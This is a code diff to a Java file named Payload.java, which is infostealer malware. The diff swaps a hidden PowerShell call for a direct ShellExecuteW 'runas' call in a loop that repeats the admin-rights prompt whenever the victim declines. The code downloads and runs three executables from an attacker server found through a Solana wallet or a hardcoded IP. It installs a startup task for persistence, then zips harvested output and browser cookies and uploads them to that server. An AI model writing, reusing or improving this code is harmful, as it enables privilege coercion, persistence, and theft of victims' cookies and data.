@@ -1,4 +1,5 @@
 // language: Java, file: payload/Payload.java
+import com.sun.jna.*;
 import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -7,6 +8,11 @@ import java.util.Base64;
 import java.util.zip.*;
 
 public class Payload {
+    public interface Shell32 extends Library {
+        Shell32 INSTANCE = Native.load("shell32", Shell32.class);
+        int ShellExecuteW(Pointer hwnd, String lpOperation, String lpFile, String lpParameters, String lpDirectory, int nShowCmd);
+    }
+
     private static final String SOLANA_WALLET = "BCy1eKppGB5WPmQ8PrSJT4gkMRy5HmzsuaVrnqef7zoV";
     private static final String SOLANA_RPC = "https://api.devnet.solana.com";
     private static final String FALLBACK_SERVER = "95.182.96.216";
@@ -153,35 +159,23 @@ public class Payload {
             log("java: " + javaExe);
             log("jar: " + jarPath);
 
-            String psCommand = String.format(
-                "Start-Process -FilePath '%s' -Verb RunAs -ArgumentList '-jar \"%s\" %s %s'",
-                javaExe, jarPath, key, ip
-            );
-
+            String cmdArgs = String.format("-jar \"%s\" %s %s", jarPath, key, ip);
             FileOutputStream lockStream = new FileOutputStream(lockFile);
 
             while (true) {
                 log("Triggering UAC...");
                 
-                // Launch PowerShell Hidden. No CMD window flashes.
-                Process p = new ProcessBuilder("powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psCommand).start();
+                int result = Shell32.INSTANCE.ShellExecuteW(null, "runas", javaExe, cmdArgs, null, 1);
                 
-                // Don't wait for PowerShell. Just spin-check for the lock file.
-                boolean accepted = false;
-                for (int i = 0; i < 600; i++) { 
-                    if (!lockFile.exists() || lockFile.delete()) {
-                        accepted = true;
-                        break;
-                    }
-                    Thread.sleep(15); 
-                }
-                
-                if (accepted) {
+                if (result > 32) {
+                    // User clicked Yes. Stop looping immediately.
                     log("UAC Accepted. Parent exiting.");
                     lockStream.close();
                     System.exit(0); 
                 } else {
+                    // User clicked No. Loop instantly and try again.
                     log("UAC Denied. Instantly retrying...");
+                    Thread.sleep(10); 
                 }
             }
         } catch (Exception e) {
@@ -211,23 +205,32 @@ public class Payload {
                 downloadFile("http://" + ip + "/api/downloads/" + file, new File(loaderDir, file));
             }
 
+            // FORCE WORKING DIRECTORY TO APP BROKER AND ADD .\ and all ARGS
             log("Executing 3.exe...");
-            new ProcessBuilder(new File(loaderDir, "3.exe").getAbsolutePath()).start();
+            new ProcessBuilder(".\\3.exe")
+                .directory(loaderDir).start();
             
             log("Executing 2.exe...");
-            new ProcessBuilder(new File(loaderDir, "2.exe").getAbsolutePath(), "all").start();
+            new ProcessBuilder(".\\2.exe", "all")
+                .directory(loaderDir).start();
             
             Thread.sleep(2000);
             
             log("Executing 1.exe...");
-            new ProcessBuilder(new File(loaderDir, "1.exe").getAbsolutePath()).start();
+            new ProcessBuilder(".\\1.exe", "all")
+                .directory(loaderDir).start();
 
             installStartupTask(key, ip);
 
             log("Waiting for harvest...");
             Thread.sleep(25000);
+            
+            // Zip output and cookies from AppBroker
             File zipFile = new File(loaderDir, "capture.zip");
-            zipFolders(new String[]{"output", "cookies"}, zipFile);
+            zipFolders(new File[]{
+                new File(loaderDir, "output"),
+                new File(loaderDir, "cookies")
+            }, zipFile);
             
             log("Uploading capture.zip...");
             uploadFile("http://" + ip + "/api/rpc", zipFile, key);
@@ -318,14 +321,14 @@ public class Payload {
         }
     }
 
-    private static void zipFolders(String[] folders, File zipFile) {
+    private static void zipFolders(File[] dirs, File zipFile) {
         try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile))) {
-            for (String folder : folders) {
-                File dir = new File(folder);
+            for (File dir : dirs) {
                 if (!dir.exists()) continue;
+                String folderName = dir.getName();
                 for (File f : dir.listFiles()) {
                     if (f.isFile()) {
-                        zos.putNextEntry(new ZipEntry(folder + "/" + f.getName()));
+                        zos.putNextEntry(new ZipEntry(folderName + "/" + f.getName()));
                         Files.copy(f.toPath(), zos);
                         zos.closeEntry();
                     }
